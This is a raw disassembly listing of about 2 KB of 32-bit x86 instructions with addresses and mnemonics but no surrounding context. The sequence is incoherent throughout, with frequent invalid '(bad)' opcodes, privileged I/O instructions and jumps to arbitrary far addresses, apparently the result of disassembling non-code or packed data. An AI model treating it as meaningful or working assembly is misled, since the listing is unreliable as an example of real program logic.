  411fb1:	rol    BYTE PTR [edx+0x42],0x2d
  411fb5:	mov    edi,0x7d787789
  411fba:	fcomp  DWORD PTR ds:0x179a49af
  411fc0:	sub    DWORD PTR [esp+ebx*8],eax
  411fc3:	lea    eax,[eax-0x1c]
  411fc6:	adc    ah,cl
  411fc8:	sbb    esi,DWORD PTR [edi-0x4b23650e]
  411fce:	cld    
  411fcf:	test   eax,0xef2e40cb
  411fd4:	test   BYTE PTR [eax-0x66],dh
  411fd7:	sbb    eax,0x3b8d45c2
  411fdc:	dec    ecx
  411fdd:	shl    dl,1
  411fdf:	pop    edx
  411fe0:	jge    0x411fa0
  411fe2:	js     0x411fba
  411fe4:	out    0x52,eax
  411fe6:	popa   
  411fe7:	retf   
  411fe8:	push   esp
  411fe9:	shl    BYTE PTR [edx-0x5],cl
  411fec:	inc    esi
  411fed:	ins    DWORD PTR es:[edi],dx
  411fee:	mov    edi,0xddcd2cba
  411ff3:	inc    esi
  411ff4:	mul    cl
  411ff6:	cmp    al,0x31
  411ff8:	out    dx,eax
  411ff9:	fimul  DWORD PTR [ecx+0x10a4d619]
  411fff:	mov    DWORD PTR [esp+eiz*8+0x12],ebp
  412003:	popa   
  412004:	inc    ebx
  412005:	ins    DWORD PTR es:[edi],dx
  412006:	jae    0x41200c
  412008:	popf   
  412009:	stos   BYTE PTR es:[edi],al
  41200a:	rcl    DWORD PTR [di-0x66],cl
  41200e:	retf   0xfebd
  412011:	rol    DWORD PTR [edi-0x8],0xd7
  412015:	inc    ebp
  412016:	movhlps xmm1,xmm4
  412019:	xor    DWORD PTR [edx-0x75],edx
  41201c:	inc    esp
  41201d:	inc    ebp
  41201e:	adc    eax,0x4131f721
  412023:	mov    ch,BYTE PTR [edi+0x1213f136]
  412029:	shl    edi,0xf0
  41202c:	dec    eax
  41202d:	mov    dh,0xde
  41202f:	cmp    dh,BYTE PTR [edi]
  412031:	jle    0x41206b
  412033:	inc    ebx
  412034:	hlt    
  412035:	dec    esp
  412036:	cmc    
  412037:	jmp    0x9c31:0x66fa8e52
  41203e:	fwait
  41203f:	out    dx,al
  412040:	daa    
  412041:	push   0xbe3da1f3
  412046:	push   0xffffffe7
  412048:	cli    
  412049:	cld    
  41204a:	rol    BYTE PTR [ecx-0x80],1
  41204d:	les    edx,FWORD PTR [edi+0x5e]
  412050:	ret    
  412051:	addr16 dec edi
  412053:	xchg   esp,eax
  412054:	inc    ecx
  412055:	mov    ?,WORD PTR [ebx]
  412057:	and    DWORD PTR [edx],esp
  412059:	pop    edx
  41205a:	xchg   ebp,eax
  41205b:	sbb    al,0xab
  41205d:	test   eax,0x9c4a5af0
  412062:	or     ebx,0x269bc074
  412068:	or     al,ch
  41206a:	ds call 0x92e6:0x6d8f8eda
  412072:	add    ecx,ebp
  412074:	dec    ecx
  412075:	(bad)  
  412076:	jmp    0x412075
  412078:	out    dx,eax
  412079:	stc    
  41207a:	retf   0xa190
  41207d:	push   cs
  41207e:	loope  0x412077
  412080:	push   edi
  412081:	xchg   ebx,eax
  412082:	neg    DWORD PTR [edi-0x3]
  412085:	mov    WORD PTR [eax-0x2f],cs
  412088:	pop    es
  412089:	ss cmp cl,bl
  41208c:	pop    ds
  41208d:	out    dx,al
  41208e:	shl    BYTE PTR es:[edx],cl
  412091:	jmp    0x9da9:0xc3ecf0ca
  412098:	(bad)  [eax]
  41209a:	jns    0x41202a
  41209c:	xchg   BYTE PTR [ecx],ah
  41209e:	(bad)  
  41209f:	call   0x81745532
  4120a4:	popa   
  4120a5:	or     BYTE PTR [edi-0x2af771bb],bl
  4120ab:	or     eax,DWORD PTR [ebx]
  4120ad:	jge    0x4120b8
  4120af:	mov    cs,WORD PTR [edi+0x3c323dd6]
  4120b5:	fmul   QWORD PTR [edx]
  4120b7:	fsubr  st,st(3)
  4120b9:	dec    ecx
  4120ba:	push   ss
  4120bb:	sub    BYTE PTR [esi+0x13972ec1],al
  4120c1:	rcl    eax,cl
  4120c3:	sub    ebx,DWORD PTR [edx]
  4120c5:	hlt    
  4120c6:	xchg   ecx,eax
  4120c7:	mov    gs,esp
  4120c9:	dec    edi
  4120ca:	daa    
  4120cb:	cdq    
  4120cc:	cdq    
  4120cd:	gs sbb eax,0x47631b58
  4120d3:	jne    0x412074
  4120d5:	pop    eax
  4120d6:	dec    edi
  4120d7:	push   cs
  4120d8:	jmp    0x412076
  4120da:	pop    ss
  4120db:	inc    eax
  4120dc:	push   ebx
  4120dd:	jmp    0x49de:0xb4d54d8e
  4120e4:	ss test eax,0xa59858a
  4120ea:	das    
  4120eb:	cmp    al,0xf7
  4120ed:	cmp    dh,BYTE PTR [edx+edx*4]
  4120f0:	mov    ebx,0x86c937a3
  4120f5:	pop    ebp
  4120f6:	adc    esi,ebx
  4120f8:	out    dx,eax
  4120f9:	mov    DWORD PTR [edx],esi
  4120fb:	push   ds
  4120fc:	xor    eax,DWORD PTR [esi]
  4120fe:	test   BYTE PTR [esi],0x1b
  412101:	jb     0x41216b
  412103:	frstor [ebp+0x1354d2bd]
  412109:	test   ebx,edx
  41210b:	or     eax,DWORD PTR [edi]
  41210d:	test   al,0xc6
  41210f:	mov    al,0xf
  412111:	retf   0xbfcc
  412114:	add    al,0x5d
  412116:	cmp    DWORD PTR [ecx+0x1cc4080e],eax
  41211c:	xchg   ebx,eax
  41211d:	(bad)  
  41211e:	iret   
  41211f:	sub    eax,0x87f74a14
  412124:	fs pop esi
  412126:	add    al,0x2d
  412128:	int3   
  412129:	inc    ebp
  41212a:	push   cs
  41212b:	sbb    eax,DWORD PTR [ecx]
  41212d:	lock add bx,WORD PTR [edi-0x7d2d2623]
  412135:	adc    ah,BYTE PTR [ebp+0x265ee252]
  41213b:	inc    ebp
  41213c:	pop    esi
  41213d:	pusha  
  41213e:	jmp    0x4120ef
  412140:	jns    0x41216b
  412142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412143:	cmp    DWORD PTR [ebx+ebp*4],edi
  412146:	push   ebp
  412147:	dec    ebx
  412148:	sbb    al,0xa7
  41214a:	dec    esi
  41214b:	popa   
  41214c:	pushf  
  41214d:	adc    eax,DWORD PTR [esi]
  41214f:	(bad)  
  412150:	in     eax,dx
  412151:	leave  
  412152:	popa   
  412153:	popf   
  412154:	inc    ebp
  412155:	idiv   BYTE PTR [ebp-0x47]
  412158:	dec    esi
  412159:	lock mov ecx,0x367fe85d
  41215f:	xor    al,0x74
  412161:	es mov ecx,0xaf5f1fc7
  412167:	inc    ebp
  412168:	jmp    0x268c:0x12f3b99d
  41216f:	mov    eax,0xb8f2bcd0
  412174:	jmp    0xb4ea53db
  412179:	cmp    DWORD PTR [esi],esi
  41217b:	test   al,0x87
  41217d:	icebp  
  41217e:	cs sub eax,0x5ada9ed7
  412184:	loope  0x412109
  412186:	lea    edx,[ebx]
  412188:	bound  eax,QWORD PTR [edi]
  41218a:	test   al,0x77
  41218c:	sbb    al,0x1
  41218e:	adc    al,ah
  412190:	xor    DWORD PTR [eax-0x21],0x2d5c155b
  412197:	fimul  WORD PTR [ebx+0x41]
  41219a:	mov    bl,0x15
  41219c:	add    eax,eax
  41219e:	mov    ah,BYTE PTR [eax+edi*2-0x5e]
  4121a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a3:	add    eax,0x63fe7ced
  4121a8:	inc    ebx
  4121a9:	sub    BYTE PTR [edi+0x44],bh
  4121ac:	ret    
  4121ad:	bnd ja 0x412215
  4121b0:	pop    ecx
  4121b1:	sub    esi,DWORD PTR [esp+esi*8+0x27d67cf4]
  4121b8:	(bad)  
  4121b9:	sbb    edx,DWORD PTR [ebp-0x4e]
  4121bc:	dec    edi
  4121bd:	scas   eax,DWORD PTR es:[edi]
  4121be:	dec    ecx
  4121bf:	mov    ecx,0x16f235b
  4121c4:	scas   al,BYTE PTR es:[edi]
  4121c5:	shr    cl,cl
  4121c7:	mov    bh,BYTE PTR [ebp+0x36]
  4121ca:	ins    DWORD PTR es:[edi],dx
  4121cb:	pop    edx
  4121cc:	call   DWORD PTR [eax-0x62e97c76]
  4121d2:	inc    eax
  4121d3:	sahf   
  4121d4:	test   al,0x9
  4121d6:	lds    edx,FWORD PTR [edi+0x6a]
  4121d9:	adc    edi,DWORD PTR [edx+0x7717f204]
  4121df:	out    0x1e,eax
  4121e1:	ins    DWORD PTR es:[edi],dx
  4121e2:	dec    ebx
  4121e3:	pop    ecx
  4121e4:	jle    0x412194
  4121e6:	jecxz  0x41220a
  4121e8:	mov    ecx,0x3c36c68a
  4121ed:	pop    es
  4121ee:	std    
  4121ef:	popa   
  4121f0:	cwde   
  4121f1:	repz shr DWORD PTR [esi],0x64
  4121f5:	inc    edx
  4121f6:	sti    
  4121f7:	xor    BYTE PTR [esi],cl
  4121f9:	add    ebp,esi
  4121fb:	cdq    
  4121fc:	mov    esi,0xb61708d9
  412201:	ja     0x41221f
  412203:	sbb    cl,dl
  412205:	adc    esi,DWORD PTR [edx]
  412207:	arpl   WORD PTR [edx+0x6403fb9b],sp
  41220d:	retf   
  41220e:	pop    ebp
  41220f:	xor    al,BYTE PTR [ebx-0x12]
  412212:	pop    edi
  412213:	aas    
  412214:	push   ecx
  412215:	mov    BYTE PTR [eax-0x1e6401af],bl
  41221b:	dec    esp
  41221c:	out    0x90,al
  41221e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41221f:	mov    dl,0x84
  412221:	cwde   
  412222:	neg    dh
  412224:	loope  0x412277
  412226:	xor    edi,DWORD PTR [ecx]
  412228:	in     al,dx
  412229:	fndisi(8087 only) 
  41222b:	mov    esi,0xa62cb86
  412230:	fiadd  DWORD PTR [eax+edi*2+0x57]
  412234:	jne    0x412240
  412236:	outs   dx,DWORD PTR ds:[esi]
  412237:	mov    bl,0x1f
  412239:	psubsb mm4,mm4
  41223c:	repnz imul esi,DWORD PTR [esi],0x76eeacf
  412243:	les    ebx,FWORD PTR [ebx+0x2]
  412246:	and    al,0xd8
  412248:	ret    
  412249:	imul   esi,eax,0xfffffffe
  41224c:	stc    
  41224d:	popf   
  41224e:	dec    ecx
  41224f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412250:	jb     0x4122a0
  412252:	add    BYTE PTR [edi-0x7b],bh
  412255:	jl     0x4122d4
  412257:	shl    BYTE PTR [edi],0xe0
  41225a:	stos   BYTE PTR es:[edi],al
  41225b:	or     eax,0xbccba97d
  412260:	arpl   cx,bp
  412262:	xchg   edi,eax
  412263:	dec    ebp
  412264:	mov    bh,0x7a
  412266:	add    bh,ah
  412268:	sbb    al,0xeb
  41226a:	gs adc eax,0x4107f742
  412270:	pop    ds
  412271:	not    DWORD PTR [edx+eax*2]
  412274:	sbb    BYTE PTR [eax],0x73
  412277:	xor    al,0xee
  412279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227a:	mov    ecx,0xf79df12b
  41227f:	adc    al,0x2
  412281:	or     DWORD PTR [ebx+0x56],ecx
  412284:	push   ebx
  412285:	ror    dh,1
  412287:	cmp    esi,0x7e
  41228a:	sub    ebx,0x87322bb5
  412290:	lea    ebx,[edx]
  412292:	adc    esi,ecx
  412294:	daa    
  412295:	aaa    
  412296:	test   eax,0x64582d5e
  41229b:	dec    edx
  41229c:	(bad)  
  41229d:	stos   BYTE PTR es:[edi],al
  41229e:	cmp    bl,cl
  4122a0:	xchg   ecx,eax
  4122a1:	mov    dh,0xa8
  4122a3:	xchg   ecx,edx
  4122a5:	cmp    edi,DWORD PTR [edx]
  4122a7:	arpl   WORD PTR [ecx+esi*2],si
  4122aa:	jp     0x412317
  4122ac:	mov    al,ds:0xecef0904
  4122b1:	popa   
  4122b2:	push   eax
  4122b3:	adc    DWORD PTR [ebp+0x53425c4b],0x63
  4122ba:	test   esi,edx
  4122bc:	cmc    
  4122bd:	push   ds
  4122be:	out    0xdf,eax
  4122c0:	jno    0x41226d
  4122c2:	and    al,0x69
  4122c4:	inc    edx
  4122c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122c6:	scas   eax,DWORD PTR es:[edi]
  4122c7:	cmp    esi,0x752889d0
  4122cd:	pop    ss
  4122ce:	mov    ebx,0x4653965f
  4122d3:	pop    esp
  4122d4:	cdq    
  4122d5:	stc    
  4122d6:	das    
  4122d7:	jno    0x41229d
  4122d9:	jnp    0x4122aa
  4122db:	fist   WORD PTR [eax+0x6f00e796]
  4122e1:	xor    eax,0xfa291675
  4122e6:	into   
  4122e7:	sub    eax,0x80e131fe
  4122ec:	dec    BYTE PTR [edi]
  4122ee:	jle    0x412333
  4122f0:	push   ecx
  4122f1:	and    DWORD PTR [ebx-0x5d6cb859],0xbd33db43
  4122fb:	std    
  4122fc:	fnstenv [ebx]
  4122fe:	test   bl,dl
  412300:	mov    gs,WORD PTR [ebp-0x23a4c950]
  412306:	jp     0x4122d4
  412308:	push   ebx
  412309:	sbb    eax,0xd18a69ea
  41230e:	xchg   ebx,eax
  41230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412310:	sub    BYTE PTR [esi-0x55],dl
  412313:	call   FWORD PTR [edx-0x5ae4b924]
  412319:	test   BYTE PTR [esi+0xe319942],0xc7
  412320:	aam    0x45
  412322:	mov    ah,0xb9
  412324:	jp     0x4122f3
  412326:	jge    0x4122ba
  412328:	ja     0x4122e7
  41232a:	rol    DWORD PTR [esi+0x6f],cl
  41232d:	shl    BYTE PTR [edx-0x58],cl
  412330:	(bad)  
  412331:	jns    0x4122fd
  412333:	add    al,0x3a
  412335:	ins    DWORD PTR es:[edi],dx
  412336:	repnz ficomp WORD PTR [esi-0x4a]
  41233a:	lds    eax,FWORD PTR [ebp+ebp*2-0xfdfb79a]
  412341:	mov    cl,0xef
  412343:	ret    
  412344:	mov    eax,0x213a97b3
  412349:	sahf   
  41234a:	dec    ebx
  41234b:	cmp    al,0x67
  41234d:	xor    eax,0x68293f87
  412352:	and    al,BYTE PTR ds:0xa98af33d
  412358:	cdq    
  412359:	adc    BYTE PTR [ebx+0x7a],0x64
  41235d:	ror    BYTE PTR [esi],1
  41235f:	cmp    al,0x5d
  412361:	xor    cl,ah
  412363:	xlat   BYTE PTR ds:[ebx]
  412364:	inc    ecx
  412365:	push   ebx
  412366:	jp     0x4123dc
  412368:	xlat   BYTE PTR ds:[ebx]
  412369:	mov    dl,0xfc
  41236b:	mov    ds:0xd2ddcdd7,eax
  412370:	sub    ebp,DWORD PTR [ebx]
  412372:	mov    edi,0xbdb1028b
  412377:	sbb    edx,DWORD PTR [ebx]
  412379:	lods   al,BYTE PTR ds:[esi]
  41237a:	ror    DWORD PTR [ecx],0x85
  41237d:	loopne 0x41230c
  41237f:	(bad)  
  412380:	jecxz  0x4123c6
  412382:	(bad)  
  412383:	xor    ebx,esp
  412385:	retf   0x12fd
  412388:	push   ebp
  412389:	push   ebx
  41238a:	push   edi
  41238b:	xchg   esi,eax
  41238c:	fcomp  st(2)
  41238e:	movaps xmm2,xmm0
  412391:	xchg   esi,eax
  412392:	rcr    BYTE PTR [bp+si-0x7c5b],cl
  412397:	cmp    edi,0x3b750219
  41239d:	xchg   DWORD PTR [ebp-0x41],ecx
  4123a0:	mov    ah,0xce
  4123a2:	xlat   BYTE PTR ds:[ebx]
  4123a3:	xchg   ecx,eax
  4123a4:	xor    cl,BYTE PTR [ecx+0x1f]
  4123a7:	and    DWORD PTR [edx+0x651fffe8],ebx
  4123ad:	sbb    BYTE PTR [esi],dl
  4123af:	std    
  4123b0:	gs (bad) 
  4123b2:	pop    ss
  4123b3:	inc    esp
  4123b4:	and    eax,DWORD PTR [ebx+ebx*4]
  4123b7:	jl     0x4123ff
  4123b9:	and    al,0x85
  4123bb:	into   
  4123bc:	scas   al,BYTE PTR es:[edi]
  4123bd:	nop
  4123be:	mov    ds,WORD PTR [edi-0x55]
  4123c1:	into   
  4123c2:	dec    edi
  4123c3:	clc    
  4123c4:	dec    edi
  4123c5:	mov    eax,ds:0x7d069fc0
  4123ca:	repnz dec esi
  4123cc:	and    DWORD PTR [edi],esi
  4123ce:	jl     0x412422
  4123d0:	cmp    eax,0x96f8cb31
  4123d5:	jl     0x4123f2
  4123d7:	or     DWORD PTR [esi],esp
  4123d9:	mov    ecx,0xcd9ea08f
  4123de:	iret   
  4123df:	jo     0x4123c0
  4123e1:	inc    eax
  4123e2:	sub    bh,BYTE PTR [ebp+0x3a4949f4]
  4123e8:	xor    al,0x48
  4123ea:	adc    ebx,esi
  4123ec:	sbb    DWORD PTR [esi],edi
  4123ee:	mov    cl,0xb6
  4123f0:	adc    eax,0xb465e07f
  4123f5:	dec    ecx
  4123f6:	call   0x19215ede
  4123fb:	popa   
  4123fc:	jle    0x4123e0
  4123fe:	int3   
  4123ff:	stos   DWORD PTR es:[edi],eax
  412400:	dec    esp
  412401:	shl    edx,0x42
  412404:	popa   
  412405:	imul   BYTE PTR [ecx+0x2ccb592]
  41240b:	rol    DWORD PTR [esi],cl
  41240d:	gs cld 
  41240f:	add    ebx,ebp
  412411:	push   cs
  412412:	cld    
  412413:	imul   edx,DWORD PTR [ebx+0x44b3190],0x42
  41241a:	jecxz  0x412472
  41241c:	pop    ss
  41241d:	xchg   ebp,eax
  41241e:	sub    ah,BYTE PTR [eax-0x19]
  412421:	push   ebx
  412422:	adc    DWORD PTR [esp+edx*4],ecx
  412425:	pusha  
  412426:	lods   al,BYTE PTR ds:[esi]
  412427:	fwait
  412428:	nop
  412429:	dec    edi
  41242a:	jne    0x41247e
  41242c:	and    BYTE PTR [ecx-0x5b],ch
  41242f:	lods   al,BYTE PTR ds:[esi]
  412430:	dec    esp
  412431:	push   ebx
  412432:	xor    ah,BYTE PTR [ecx-0x49]
  412435:	fidiv  DWORD PTR [ebx+ebp*4]
  412438:	pop    ds
  412439:	adc    ch,dl
  41243b:	(bad)  
  41243c:	pop    ebp
  41243d:	add    DWORD PTR [ebx+0x245c5cc7],ebx
  412443:	cld    
  412444:	cs test eax,0x80ba2f93
  41244a:	in     eax,0x37
  41244c:	mov    es,eax
  41244e:	(bad)  
  41244f:	xchg   edx,eax
  412450:	push   ss
  412451:	sub    BYTE PTR [ecx+eiz*2],bh
  412454:	retf   0x1b9f
  412457:	push   eax
  412458:	sbb    DWORD PTR [esi+0x47e6db16],esi
  41245e:	push   es
  41245f:	and    al,cl
  412461:	scas   eax,DWORD PTR es:[edi]
  412462:	je     0x412432
  412464:	pop    ds
  412465:	pop    ecx
  412466:	jmp    0xa15f648d
  41246b:	out    dx,eax
  41246c:	daa    
  41246d:	push   ss
  41246e:	int    0x35
  412470:	xchg   edi,eax
  412471:	mov    bh,0xc4
  412473:	or     ah,BYTE PTR [ebx+0x5870b42a]
  412479:	dec    ecx
  41247a:	mov    DWORD PTR [esi],esp
  41247c:	fdivr  DWORD PTR [ebp-0x41]
  41247f:	loope  0x4124fc
  412481:	jb     0x41245a
  412483:	test   al,0x33
  412485:	fst    DWORD PTR ss:[eax+0x50]
  412489:	and    edx,DWORD PTR [esi]
  41248b:	and    DWORD PTR [ebx-0x5c],ebp
  41248e:	fistp  QWORD PTR [eax]
  412490:	std    
  412491:	mov    eax,tr0
  412494:	xchg   edx,eax
  412495:	and    BYTE PTR [ebx],al
  412497:	mov    edx,0xb3f9ccc2
  41249c:	test   ah,bl
  41249e:	xchg   ecx,eax
  41249f:	push   ds
  4124a0:	adc    DWORD PTR [ebp-0x40],ecx
  4124a3:	sar    DWORD PTR [ebp+0x64],0xbf
  4124a7:	ins    BYTE PTR es:[edi],dx
  4124a8:	and    ebx,eax
  4124aa:	gs enter 0xcd80,0xc6
  4124af:	repnz fstp TBYTE PTR [eax]
  4124b2:	into   
  4124b3:	retf   
  4124b4:	call   0x37998c27
  4124b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124bb:	aaa    
  4124bc:	add    al,0xcf
  4124be:	xchg   ecx,eax
  4124bf:	mov    dh,0xb
  4124c1:	push   edx
  4124c2:	xchg   ecx,eax
  4124c3:	add    BYTE PTR fs:[edx+esi*2-0x8],0xdb
  4124c9:	int3   
  4124ca:	xchg   edi,eax
  4124cb:	ficomp DWORD PTR [esi+eax*1]
  4124ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124cf:	enter  0x795f,0x7
  4124d3:	lds    edi,FWORD PTR [ecx-0x4b]
  4124d6:	mov    esi,0x64f77618
  4124db:	fmul   DWORD PTR [ecx-0x52]
  4124de:	xchg   esi,eax
  4124df:	mov    dl,0x7f
  4124e1:	inc    edi
  4124e2:	xor    esi,DWORD PTR [esi-0x3b698991]
  4124e8:	sbb    eax,0x94bcf9e2
  4124ed:	outs   dx,BYTE PTR ds:[esi]
  4124ee:	xchg   ebx,eax
  4124ef:	ficomp DWORD PTR [esi+edi*4-0x65]
  4124f3:	mov    edi,0x55b8b7bb
  4124f8:	retf   0x4e17
  4124fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124fc:	mov    eax,ebx
  4124fe:	xchg   esi,eax
  4124ff:	push   0x1d
  412501:	and    DWORD PTR [ebx+edi*1+0x7c8be2b4],ebp
  412508:	pop    ebp
  412509:	(bad)  
  41250a:	rol    BYTE PTR [eax],1
  41250c:	add    ecx,esp
  41250e:	lds    eax,FWORD PTR [ecx+ecx*2]
  412511:	xchg   esi,eax
  412512:	mov    cl,0xa3
  412514:	mov    BYTE PTR [ecx+eax*8+0xc],dl
  412518:	dec    eax
  412519:	repnz push eax
  41251b:	ins    DWORD PTR es:[edi],dx
  41251c:	(bad)  
  41251d:	iret   
  41251e:	xchg   edx,eax
  41251f:	jmp    0xf2598ab8
  412524:	inc    esp
  412525:	xchg   DWORD PTR [ebp-0x7a4c26e],eax
  41252b:	inc    esp
  41252c:	cmp    edi,DWORD PTR [edx+0x60464879]
  412532:	je     0x412550
  412534:	in     al,dx
  412535:	jno    0x4125ae
  412537:	mov    al,0xf8
  412539:	cmp    al,0xa4
  41253b:	daa    
  41253c:	iret   
  41253d:	sub    dl,dl
  41253f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412540:	jmp    0x412547
  412542:	es mov ecx,0x24275d7
  412548:	cmp    BYTE PTR [eax+0x4c2cd2b7],al
  41254e:	add    eax,0x2597934e
  412553:	xlat   BYTE PTR ds:[ebx]
  412554:	rcl    DWORD PTR [esi],cl
  412556:	(bad)  
  412557:	lods   al,BYTE PTR ds:[esi]
  412558:	imul   ebx,DWORD PTR [ecx+0x6a],0x54
  41255c:	cmp    ah,BYTE PTR [ecx+0x7b]
  41255f:	pop    edi
  412560:	mov    ds:0xabee35a5,eax
  412565:	push   esp
  412566:	jmp    0xc745667c
  41256b:	adc    esi,DWORD PTR [ebp+0x1b]
  41256e:	mov    ds:0xd30b0745,al
  412573:	fdivr  st(0),st
  412575:	out    0x69,eax
  412577:	std    
  412578:	jmp    0x4125c8
  41257a:	inc    ebx
  41257b:	push   eax
  41257c:	sbb    al,0x87
  41257e:	in     eax,dx
  41257f:	dec    esi
  412580:	push   eax
  412581:	lock xor al,0xc8
  412584:	dec    ebp
  412585:	scas   al,BYTE PTR es:[edi]
  412586:	cmp    BYTE PTR [ebp-0x13e53de0],dl
  41258c:	stos   DWORD PTR es:[edi],eax
  41258d:	mov    ecx,0x558968e3
  412592:	shl    DWORD PTR [edx-0x59],cl
  412595:	jmp    0x4125ad
  412597:	add    eax,0x191f0384
  41259c:	idiv   DWORD PTR [eax-0x5867ecda]
  4125a2:	or     eax,DWORD PTR [ebp-0x5ea0e005]
  4125a8:	sub    BYTE PTR [edx+0xe1f49b7],0x85
  4125af:	call   0x6393:0x96586c42
  4125b6:	cmp    al,0xbf
  4125b8:	sahf   
  4125b9:	ja     0x4125c2
  4125bb:	sub    al,0x4d
  4125bd:	pop    ecx
  4125be:	mov    dl,0x69
  4125c0:	fisttp WORD PTR [esi+0x13dead8b]
  4125c6:	or     eax,0xb533467e
  4125cb:	xchg   esp,eax
  4125cc:	sahf   
  4125cd:	sub    al,dh
  4125cf:	mov    eax,ds:0x2816ec13
  4125d4:	xchg   esi,eax
  4125d5:	(bad)  
  4125d6:	int    0xaf
  4125d8:	sub    al,0xfc
  4125da:	ffreep st(0)
  4125dc:	adc    bh,BYTE PTR [eax-0x25c082c8]
  4125e2:	out    dx,al
  4125e3:	jmp    0x4e9423a6
  4125e8:	push   esp
  4125e9:	dec    DWORD PTR [esi]
  4125eb:	ins    BYTE PTR es:[edi],dx
  4125ec:	mov    dl,0xf
  4125ee:	stos   BYTE PTR es:[edi],al
  4125ef:	popa   
  4125f0:	push   0xb
  4125f2:	push   ebx
  4125f3:	add    BYTE PTR ds:0xc430ea0b,dl
  4125f9:	ret    0x497b
  4125fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125fd:	(bad)  
  4125fe:	lock mov eax,ds:0x88111b68
  412604:	jbe    0x412600
  412606:	jae    0x41262f
  412608:	mov    edx,eax
  41260a:	mov    bl,0x7e
  41260c:	cmp    edi,ebx
  41260e:	or     eax,0x9fb8dcef
  412613:	loopne 0x4125b6
  412615:	jmp    0x412651
  412617:	inc    ebp
  412618:	arpl   WORD PTR [eax+0x73],di
  41261b:	dec    ah
  41261d:	sbb    eax,0x62c8c6e8
  412622:	jge    0x4125dc
  412624:	clc    
  412625:	mov    eax,ds:0xa592aef9
  41262a:	(bad)  
  41262b:	stos   DWORD PTR es:[edi],eax
  41262c:	push   eax
  41262d:	jmp    0x3276:0xe3fa8079
  412634:	or     dh,ch
  412636:	sbb    BYTE PTR [eax-0x5dfb942a],ah
  41263c:	out    dx,al
  41263d:	bound  esp,QWORD PTR [edi-0x79]
  412640:	(bad)  
  412642:	sub    eax,0xda69c3c4
  412647:	mov    al,ss:0xeb2425de
  41264d:	inc    esi
  41264e:	xlat   BYTE PTR ds:[ebx]
  41264f:	xchg   esi,eax
  412650:	cmc    
  412651:	and    al,0x10
  412653:	mov    ecx,0x647853f3
  412658:	and    DWORD PTR [edx-0x45683c02],eax
  41265e:	scas   eax,DWORD PTR es:[edi]
  41265f:	push   ebx
  412660:	rcr    DWORD PTR [eax+0x1d640176],0x84
  412667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412668:	sub    esp,edx
  41266a:	mov    bl,0xb4
  41266c:	push   ds
  41266d:	shr    ecx,1
  41266f:	or     al,BYTE PTR [eax]
  412671:	sbb    BYTE PTR [ebp+0x7c],dh
  412674:	or     ebp,ebx
  412676:	jg     0x4126f7
  412678:	push   es
  412679:	lds    edx,FWORD PTR [ecx+0x42]
  41267c:	mov    ebp,0x2518498b
  412681:	mov    ebx,0x9c8abac7
  412686:	in     eax,0xd4
  412688:	dec    ebx
  412689:	ja     0x41267a
  41268b:	jmp    0x3207:0xb8f2694a
  412692:	js     0x41262d
  412694:	pop    ds
  412695:	inc    edi
  412696:	in     eax,dx
  412697:	nop
  412698:	inc    ebx
  412699:	and    BYTE PTR ds:0xae23b150,ah
  41269f:	ja     0x412710
  4126a1:	lea    eax,[edx+0x1bc823ef]
  4126a7:	cmp    ebx,DWORD PTR [ecx-0x55]
  4126aa:	std    
  4126ab:	(bad)  
  4126ac:	sar    BYTE PTR [edi],1
  4126ae:	cld    
  4126af:	das    
  4126b0:	out    0x2f,al
  4126b2:	fistp  WORD PTR [edi-0xf6417e2]
  4126b8:	pop    esi
  4126b9:	jmp    0x630a4fce
  4126be:	push   eax
  4126bf:	mov    ebx,0xc4ee029b
  4126c4:	dec    ecx
  4126c6:	mov    ecx,0xb5a5de2
  4126cb:	test   eax,0xf917946
  4126d0:	cmc    
  4126d1:	jg     0x412714
  4126d3:	pop    ss
  4126d4:	push   ecx
  4126d5:	adc    eax,0x7c69ca72
  4126da:	repnz in eax,0x7b
  4126dd:	xchg   BYTE PTR [eax],bh
  4126df:	mov    bh,BYTE PTR ds:[ebp-0x33]
  4126e3:	(bad)  [eax+0x5c]
  4126e6:	push   edi
  4126e7:	dec    eax
  4126e8:	(bad)  
  4126ea:	inc    ebp
  4126eb:	mov    ds,WORD PTR [edi+0x21789da9]
  4126f1:	jecxz  0x4126b8
  4126f3:	sbb    ecx,DWORD PTR [ecx+0x695f4b14]
  4126f9:	pop    ds
  4126fa:	push   esi
  4126fb:	clc    
  4126fc:	loopne 0x4126d2
  4126fe:	stc    
  4126ff:	call   0x23:0xfea4968a
  412706:	into   
  412707:	and    al,0xcd
  412709:	cs mov edx,0x88272d3c
  41270f:	and    eax,0xb286b967
  412714:	adc    al,0x46
  412716:	cwde   
  412717:	fistp  WORD PTR [ebx+0x3f04c19]
  41271d:	lock adc al,0x6f
  412720:	and    BYTE PTR [esi-0x76],bh
  412723:	scas   al,BYTE PTR es:[edi]
  412724:	xchg   DWORD PTR [esi-0x37ea4266],esp
  41272a:	xchg   eax,ebx
  41272c:	test   al,0x53
  41272e:	lahf   
  41272f:	mov    ch,0xe0
  412731:	rcl    BYTE PTR [esi],cl
  412733:	mov    ds:0x1c35031c,eax
  412738:	and    BYTE PTR [edi-0x48],ch
  41273b:	mov    DWORD PTR [ecx-0x7ef2819e],esp
  412741:	sbb    DWORD PTR [ebx],esi
  412743:	inc    esp
  412744:	sbb    al,0xe5
  412746:	imul   BYTE PTR [ebx]
  412748:	jns    0x412745
  41274a:	fst    st(0)
  41274c:	(bad)  
  41274d:	icebp  
  41274e:	jae    0x412703
  412750:	adc    ch,cl
  412752:	add    al,0xfb
  412754:	dec    edx
  412755:	xchg   ebp,eax
  412756:	add    BYTE PTR ds:[ecx-0x5b12958],dh
  41275d:	outs   dx,DWORD PTR ds:[esi]
  41275e:	dec    esi
